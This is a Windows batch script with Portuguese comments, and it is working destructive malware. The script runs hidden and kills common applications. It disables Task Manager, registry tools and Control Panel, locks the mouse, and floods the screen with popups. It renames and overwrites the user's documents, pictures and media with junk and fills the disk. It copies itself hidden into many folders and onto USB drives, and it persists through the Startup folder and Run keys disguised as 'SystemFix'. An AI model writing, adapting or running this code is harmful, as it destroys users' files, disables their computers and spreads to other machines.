@echo off
if "%~1"=="hide" goto main
powershell -windowstyle hidden -command "Start-Process cmd -ArgumentList '/c %~nx0 hide' -WindowStyle Hidden"
exit /b

:main
setlocal enabledelayedexpansion

:: MATAR PROCESSOS (RÁPIDO)
taskkill /f /im notepad.exe >nul 2>&1
taskkill /f /im calc.exe >nul 2>&1
taskkill /f /im mspaint.exe >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im write.exe >nul 2>&1
taskkill /f /im winword.exe >nul 2>&1
taskkill /f /im excel.exe >nul 2>&1
taskkill /f /im powerpnt.exe >nul 2>&1
taskkill /f /im outlook.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1
taskkill /f /im brave.exe >nul 2>&1
taskkill /f /im discord.exe >nul 2>&1
taskkill /f /im steam.exe >nul 2>&1
taskkill /f /im steamwebhelper.exe >nul 2>&1
taskkill /f /im Spotify.exe >nul 2>&1
taskkill /f /im Code.exe >nul 2>&1
taskkill /f /im devenv.exe >nul 2>&1
taskkill /f /im git-bash.exe >nul 2>&1
taskkill /f /im VBoxSVC.exe >nul 2>&1
taskkill /f /im VirtualBox.exe >nul 2>&1

:: DESABILITAR REGISTROS (NÃO PRECISA DE ADMIN)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFolderOptions /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%temp%\hack.jpg" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >nul 2>&1

:: BAIXAR WALLPAPER (BACKGROUND)
start /b powershell -command "Invoke-WebRequest -Uri 'https://i.imgur.com/BjDp9XH.jpg' -OutFile '%temp%\hack.jpg'; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters" >nul 2>&1

:: MOUSE (ESCONDE E TRAVA)
start /b powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Hide(); while(1){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0); Start-Sleep -Milliseconds 10}" >nul 2>&1

:: POPUPS E BEEP (RODANDO JUNTO)
start /b powershell -command "Add-Type -AssemblyName System.Windows.Forms; while(1){[System.Windows.Forms.MessageBox]::Show('YOUR SYSTEM IS DESTROYED','HACKED'); Start-Sleep -Milliseconds 500}" >nul 2>&1
start /b powershell -command "while(1){[System.Console]::Beep(1000,200); [System.Console]::Beep(800,200); Start-Sleep -Milliseconds 50}" >nul 2>&1

:: CRIAR PASTAS E ARQUIVOS (BATCH PURO, RÁPIDO)
start /b cmd /c "for /l %%i in (1,1,1000) do (mkdir %userprofile%\desktop\!random! 2>nul & cd %userprofile%\desktop\!random! & for /l %%j in (1,1,200) do (echo %random% > %%j.txt 2>nul))"

:: RENOMEAR TUDO (EM PARALELO)
start /b cmd /c "for /r %userprofile%\desktop %%f in (*.*) do (ren \"%%f\" \"%random%%random%%random%\" 2>nul)"
start /b cmd /c "for /r %userprofile%\documents %%f in (*.*) do (ren \"%%f\" \"%random%%random%%random%\" 2>nul)"
start /b cmd /c "for /r %userprofile%\downloads %%f in (*.*) do (ren \"%%f\" \"%random%%random%%random%\" 2>nul)"
start /b cmd /c "for /r %userprofile%\videos %%f in (*.*) do (ren \"%%f\" \"%random%%random%%random%\" 2>nul)"
start /b cmd /c "for /r %userprofile%\music %%f in (*.*) do (ren \"%%f\" \"%random%%random%%random%\" 2>nul)"
start /b cmd /c "for /r %userprofile%\pictures %%f in (*.*) do (ren \"%%f\" \"%random%%random%%random%\" 2>nul)"

:: CORROMPER ARQUIVOS (SOBRESCREVER COM LIXO)
start /b cmd /c "for /r %userprofile%\desktop %%f in (*.txt *.docx *.xlsx *.pptx *.pdf *.jpg *.png *.mp3 *.mp4) do (echo %random% > \"%%f\" 2>nul)"
start /b cmd /c "for /r %userprofile%\documents %%f in (*.txt *.docx *.xlsx *.pptx *.pdf *.jpg *.png *.mp3 *.mp4) do (echo %random% > \"%%f\" 2>nul)"
start /b cmd /c "for /r %userprofile%\downloads %%f in (*.txt *.docx *.xlsx *.pptx *.pdf *.jpg *.png *.mp3 *.mp4) do (echo %random% > \"%%f\" 2>nul)"

:: ENCHER DISCO (ARQUIVOS DE 1MB NO TEMP)
start /b powershell -command "while(1){$f=[System.IO.Path]::Combine($env:TEMP,(Get-Random -Max 999999).ToString()+'.tmp'); fsutil file createnew $f 1048576 | Out-Null}" >nul 2>&1

:: REPLICAR (CRIAR CÓPIAS EM VÁRIAS PASTAS E EXECUTAR)
set "targets=%APPDATA% %TEMP% %USERPROFILE%\Desktop %USERPROFILE%\Documents %USERPROFILE%\Downloads %USERPROFILE%\Videos %USERPROFILE%\Music %USERPROFILE%\Pictures %WINDIR%\Temp C:\ProgramData"
for %%d in (%targets%) do (
  if exist "%%d" (
    set "rname="
    for /l %%i in (1,1,8) do set "rname=!rname!!random:~-1!"
    copy "%~f0" "%%d\!rname!.bat" >nul 2>&1
    attrib +h +s "%%d\!rname!.bat" >nul 2>&1
    start /b "" "%%d\!rname!.bat" >nul 2>&1
  )
)

:: USB (COPIA PARA TODAS AS UNIDADES REMOVÍVEIS)
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
  if exist "%%d:\" (
    copy "%~f0" "%%d:\%random%%random%.bat" >nul 2>&1
    attrib +h +s "%%d:\%random%%random%.bat" >nul 2>&1
  )
)

:: STARTUP E REGISTRO
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%random%.bat" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemFix" /t REG_SZ /d "%~f0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SystemFix" /t REG_SZ /d "%~f0" /f >nul 2>&1

:: ABRIR MUITOS CMDs (SÓ NO FINAL)
start /b cmd /c "for /l %%i in (1,1,50) do (start cmd)"

:: LOOP INFINITO (MANTÉM ATIVO)
:loop
timeout /t 1 /nobreak >nul
goto loop
